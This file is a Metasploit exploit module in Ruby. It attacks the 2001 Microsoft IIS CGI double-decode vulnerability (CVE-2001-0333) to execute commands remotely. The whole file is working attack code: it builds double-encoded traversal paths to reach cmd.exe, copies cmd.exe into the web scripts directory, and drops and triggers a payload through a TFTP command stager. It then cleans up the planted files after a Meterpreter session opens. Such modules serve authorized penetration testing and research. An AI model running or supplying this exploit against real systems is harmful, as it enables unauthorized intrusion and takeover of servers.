##
# $Id: ms01_026_dbldecode.rb 11513 2011-01-08 00:25:44Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/proto/tftp'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	# NOTE: This cannot be an HttpClient module since the response from the server
	# is not a valid HttpResponse
	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::CmdStagerTFTP

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS/PWS CGI Filename Double Decode Command Execution',
			'Description'    => %q{
					This module will execute an arbitrary payload on a Microsoft IIS installation
				that is vulnerable to the CGI double-decode vulnerability of 2001.

				NOTE: This module will leave a metasploit payload in the IIS scripts directory.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11513 $',
			'References'     =>
				[
					[ 'CVE', '2001-0333' ],
					[ 'OSVDB', '556' ],
					[ 'BID', '2708' ],
					[ 'MSB', 'MS01-026' ],
					[ 'URL', 'http://marc.info/?l=bugtraq&m=98992056521300&w=2' ]
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'May 15 2001'
		))

		register_options(
			[
				Opt::RPORT(80),
				OptBool.new('VERBOSE', [ false, 'Enable verbose output', false ]),
				OptString.new('CMD', [ false, 'Execute this command instead of using command stager', nil ])
			], self.class)

		framework.events.add_exploit_subscriber(self)
	end


	def dotdotslash
		possibilities = [
			"..%255c",
			"..%%35c",
			"..%%35%63",
			"..%25%35%63",
			".%252e/",
			"%252e./",
			"%%32%65./",
			".%%32%65/",
			".%25%32%65/",
			"%25%32%65./"
		]
		possibilities[rand(possibilities.length)]
	end


	def mini_http_request(opts, timeout=5)
		connect
		req = ''
		req << opts['method']
		req << ' '
		req << opts['uri']
		req << ' '
		req << "HTTP/1.0\r\n"
		req << "Host: #{datastore['RHOST']}\r\n"
		req << "\r\n"
		sock.put(req)

		# This isn't exactly awesome, but it seems to work..
		begin
			headers = sock.get_once(-1, timeout)
			body = sock.get_once(-1, timeout)
		rescue ::EOFError
			# nothing
		end

		if (datastore['DEBUG'])
			print_status("Headers:\n" + headers.inspect)
			print_status("Body:\n" + body.inspect)
		end
		disconnect
		[headers, body]
	end


	def check
		res = execute_command("dir")
		if (res.kind_of?(Array))
			body = res[1]
			if (body and body =~ /Directory of /)
				return Exploit::CheckCode::Vulnerable
			end
		end

		Exploit::CheckCode::Safe
	end


	#
	# NOTE: the command executes regardless of whether or not
	# a valid response is returned...
	#
	def execute_command(cmd, opts = {})

		# Don't try the start command...
		# Using the "start" method doesn't seem to make iis very happy :(
		return [nil,nil] if cmd =~ /^start [a-zA-Z]+\.exe$/

		print_status("Executing command: #{cmd}")

		uri = '/scripts/'
		exe = opts[:cgifname]
		if (not exe)
			uri << dotdotslash
			uri << dotdotslash
			uri << 'winnt/system32/cmd.exe'
		else
			uri << exe
		end
		uri << '?/x+/c+'
		uri << Rex::Text.uri_encode(cmd)

		if (datastore['VERBOSE'])
			print_status("Attemping to execute: #{uri}")
		end

		mini_http_request({
				'uri'     => uri,
				'method'  => 'GET',
			}, 20)
	end


	def exploit

		# first copy the file
		exe_fname = rand_text_alphanumeric(4+rand(4)) + ".exe"
		print_status("Copying cmd.exe to the web root as \"#{exe_fname}\"...")
		# NOTE: this assumes %SystemRoot% on the same drive as the web scripts directory
		# However, it using %SystemRoot% doesn't seem to work :(
		res = execute_command("copy \\winnt\\system32\\cmd.exe #{exe_fname}")

		if (datastore['CMD'])
			res = execute_command(datastore['CMD'], { :cgifname => exe_fname })
			if (res[0])
				print_status("Command output:\n" + res[0])
			else
				print_error("No output received")
			end

			res = execute_command("del #{exe_fname}")
			return
		end

		# Use the CMD stager to get a payload running
		execute_cmdstager({ :temp => '.', :linemax => 1400, :cgifname => exe_fname })

		# Save these file names for later deletion
		@exe_cmd_copy = exe_fname
		@exe_payload = payload_exe

		# Just for good measure, we'll make a quick, direct request for the payload
		# Using the "start" method doesn't seem to make iis very happy :(
		print_status("Triggering the payload via a direct request...")
		mini_http_request({ 'uri' => '/scripts/' + payload_exe, 'method' => 'GET' }, 1)

		handler

	end

	#
	# The following handles deleting the copied cmd.exe and payload exe!
	#
	def on_new_session(client)

		if client.type != "meterpreter"
			print_error("NOTE: you must use a meterpreter payload in order to automatically cleanup.")
			print_error("The copied exe and the payload exe must be removed manually.")
			return
		end

		return if not @exe_cmd_copy

		# stdapi must be loaded before we can use fs.file
		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

		# Delete the copied CMD.exe
		print_status("Deleting copy of CMD.exe \"#{@exe_cmd_copy}\" ...")
		client.fs.file.rm(@exe_cmd_copy)

		# Migrate so  that we can delete the payload exe
		client.console.run_single("run migrate -f")

		# Delete the payload exe
		return if not @exe_payload

		delete_me_too = "C:\\inetpub\\scripts\\" + @exe_payload

		print_status("Changing permissions on #{delete_me_too} ...")
		cmd = "C:\\winnt\\system32\\attrib.exe -r -h -s " + delete_me_too
		client.sys.process.execute(cmd, nil, {'Hidden' => true })

		print_status("Deleting #{delete_me_too} ...")
		begin
			client.fs.file.rm(delete_me_too)
		rescue ::Exception => e
			print_error("Exception: #{e.inspect}")
		end
	end

	def cleanup
		framework.events.remove_exploit_subscriber(self)
	end

end
